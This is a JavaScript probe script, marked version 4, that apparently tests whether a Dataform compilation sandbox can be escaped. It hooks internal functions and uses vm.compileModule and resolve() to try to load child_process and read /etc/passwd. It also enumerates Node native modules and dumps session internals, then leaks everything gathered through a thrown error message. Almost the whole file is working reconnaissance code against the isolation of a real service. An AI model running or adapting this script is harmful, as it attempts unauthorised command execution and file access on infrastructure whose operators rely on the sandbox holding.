// v4 — find p.nativeRequire reachable, test what it resolves

var out = {};
function safe(k, fn) {
  try {
    var v = fn();
    out[k] = (typeof v === 'string' ? v : JSON.stringify(v)).substring(0, 1500);
  } catch(e) {
    out[k] = 'ERR:' + (e && e.message ? e.message : String(e)).substring(0, 400);
  }
}

// ============ TIER A: Hook core.main to capture closure context ============
// core.main uses `p.nativeRequire` — we replace main with proxy that calls original
// in a way that lets us inspect the call site
safe('A1_hook_core_main', function() {
  var origMain = core.main;
  globalThis.__mainHookFired = false;
  core.main = function(a) {
    globalThis.__mainHookFired = true;
    globalThis.__mainCallStack = new Error().stack;
    globalThis.__mainArg = typeof a + ' len:' + (a ? String(a).length : 0);
    // Walk through original's behavior — but we want to inject our own ops
    return origMain.apply(this, arguments);
  };
  return 'hooked';
});

// ============ TIER B: vm.compileModule abuse — eval in bundle realm context ============
// Now that we know vm.compileModule(name, src) executes top-level source:
safe('B1_eval_in_compileModule_globals', function() {
  // What globals are visible inside vm.compileModule's execution?
  var src = "JSON.stringify({" +
    "process: typeof process," +
    "Buffer: typeof Buffer," +
    "require: typeof require," +
    "nativeRequire: typeof nativeRequire," +
    "global: typeof global," +
    "globalThis_keys: Object.getOwnPropertyNames(globalThis).join(',')," +
    "core: typeof core," +
    "session: typeof globalThis._DF_SESSION," +
    "restricted_fs: typeof restricted_fs" +
    "})";
  return vm.compileModule('probe.js', src);
});

safe('B2_eval_compileModule_require_natives', function() {
  // From within compileModule, try to access native modules
  var src = "try { var cp = require('child_process'); JSON.stringify({got: typeof cp, execSync: typeof cp.execSync}); } catch(e) { 'err: ' + e.message; }";
  return vm.compileModule('require_test.js', src);
});

// ============ TIER C: resolve() global probe ============
safe('C1_resolve_type', function() { return typeof resolve; });
safe('C2_resolve_src', function() { return String(resolve).substring(0, 800); });
safe('C3_resolve_workflow_settings', function() {
  try { return String(resolve('workflow_settings.yaml', '.')); } catch(e) { return 'err:' + e.message; }
});
safe('C4_resolve_dataform_core', function() {
  try { return String(resolve('@dataform/core', '.')); } catch(e) { return 'err:' + e.message; }
});
safe('C5_resolve_child_process', function() {
  try { return String(resolve('child_process', '.')); } catch(e) { return 'err:' + e.message; }
});
safe('C6_resolve_absolute_path', function() {
  try { return String(resolve('/etc/passwd', '.')); } catch(e) { return 'err:' + e.message; }
});

// ============ TIER D: bundled require WITH known good packages ============
safe('D1_require_dataform_core_package_json', function() {
  try {
    var pkg = require('@dataform/core/package.json');
    return JSON.stringify(pkg).substring(0, 500);
  } catch(e) { return 'err:' + e.message; }
});
safe('D2_require_dataform_core_bundle', function() {
  try {
    var b = require('@dataform/core/bundle.js');
    return 'type=' + typeof b + ' keys=' + Object.keys(b||{}).slice(0,15).join(',');
  } catch(e) { return 'err:' + e.message; }
});
safe('D3_require_protobufjs', function() {
  try {
    var pb = require('protobufjs');
    return 'type=' + typeof pb + ' keys=' + Object.keys(pb||{}).slice(0,15).join(',');
  } catch(e) { return 'err:' + e.message; }
});
safe('D4_require_protobufjs_minimal', function() {
  try {
    var pb = require('protobufjs/minimal');
    return 'type=' + typeof pb + ' keys=' + Object.keys(pb||{}).slice(0,15).join(',');
  } catch(e) { return 'err:' + e.message; }
});

// ============ TIER E: Find module bindings via require.cache style ============
// Bundled require uses 'f' as cache — see if we can find references
// Even if we can't access f directly, maybe we can list known module paths
safe('E1_known_modules_walk', function() {
  var tries = ['@dataform/core', '@dataform/core/package.json', '@dataform/core/bundle.js', '@dataform/core/bundle', 'fs', 'path', 'os', 'child_process', 'process', 'module', 'vm', 'crypto', 'http', 'https', 'net', 'util', 'stream', 'events', 'querystring', 'url', 'dns', 'tls', 'cluster', 'buffer', 'console', 'timers', 'worker_threads', 'assert', 'inspector'];
  var results = {};
  for (var m of tries) {
    try {
      var x = require(m);
      results[m] = 'GOT typeof=' + typeof x + (typeof x === 'object' ? ' keys=' + Object.keys(x||{}).slice(0,8).join(',') : '');
    } catch(e) { results[m] = 'err:' + e.message.substring(0,80); }
  }
  return JSON.stringify(results);
});

// ============ TIER F: restricted_fs broader probing ============
safe('F1_rfs_root', function() {
  try { return restricted_fs.readFile('.').toString().substring(0,500); } catch(e) { return 'err:' + e.message; }
});
safe('F2_rfs_node_modules_at_dataform_core', function() {
  try { return restricted_fs.readFile('node_modules/@dataform/core/package.json').toString().substring(0,500); } catch(e) { return 'err:' + e.message; }
});
safe('F3_rfs_node_modules_bundle', function() {
  try { return restricted_fs.readFile('node_modules/@dataform/core/bundle.js').toString().substring(0,500); } catch(e) { return 'err:' + e.message; }
});
safe('F4_rfs_dataform_json', function() {
  try { return restricted_fs.readFile('dataform.json').toString().substring(0,500); } catch(e) { return 'err:' + e.message; }
});

// ============ TIER G: assert function — what does it actually do? ============
safe('G1_assert_call_true', function() { try { assert(true); return 'ok'; } catch(e) { return 'err:' + e.message; } });
safe('G2_assert_call_false', function() { try { assert(false, 'fail msg'); return 'ok-no-throw'; } catch(e) { return 'err:' + e.message; } });
safe('G3_assert_keys_after_call', function() {
  return Object.getOwnPropertyNames(assert).join(',');
});

// ============ TIER H: Direct manipulation — replace core.session.compile to capture p ============
// Wait, p is closure of core.main, not session. But maybe session methods also have access to internal modules.
safe('H1_session_compile_internal_refs', function() {
  var src = String(global._DF_SESSION.compile);
  // Find all single-letter identifiers (likely modules)
  var modules = src.match(/\b[a-z]\b\./g) || [];
  var unique = [...new Set(modules)].slice(0, 30);
  return unique.join(',');
});

safe('H2_session_compileGraphChunk_internal', function() {
  var src = String(global._DF_SESSION.compileGraphChunk);
  return src.substring(0, 2000);
});

// ============ TIER I: WebAssembly with valid bytecode ============
safe('I1_wasm_compile', function() {
  // Minimal valid wasm — exports add(a, b) returning i32
  // (module
  //   (func $add (param i32 i32) (result i32) local.get 0 local.get 1 i32.add)
  //   (export "add" (func $add)))
  var bytes = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // magic + version
    0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01, 0x7f, // type section
    0x03, 0x02, 0x01, 0x00, // function section
    0x07, 0x07, 0x01, 0x03, 0x61, 0x64, 0x64, 0x00, 0x00, // export
    0x0a, 0x09, 0x01, 0x07, 0x00, 0x20, 0x00, 0x20, 0x01, 0x6a, 0x0b // code
  ]);
  var m = new WebAssembly.Module(bytes);
  var i = new WebAssembly.Instance(m, {});
  return 'wasm add(3,4)=' + i.exports.add(3, 4);
});

// ============ TIER J: Try every conceivable native module name via bundled require ============
// AND via vm.compileModule's internal require
safe('J1_compileModule_native_require_loop', function() {
  var natives = ['fs', 'child_process', 'net', 'path', 'process', 'os', 'crypto', 'http', 'https', 'stream', 'tty', 'module', 'vm', 'worker_threads', 'inspector', 'v8', 'perf_hooks', 'async_hooks', 'cluster', 'tls', 'url', 'dns', 'querystring', 'string_decoder', 'punycode'];
  var src = "var natives = " + JSON.stringify(natives) + ";\n" +
    "var results = {};\n" +
    "for (var n of natives) {\n" +
    "  try { var r = require(n); results[n] = 'GOT keys=' + Object.keys(r||{}).slice(0,8).join(','); }\n" +
    "  catch(e) { results[n] = 'err:' + e.message.substring(0,80); }\n" +
    "}\n" +
    "JSON.stringify(results)";
  return vm.compileModule('native_loop.js', src);
});

module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };
throw new Error('PROBE_v4:' + JSON.stringify(out));
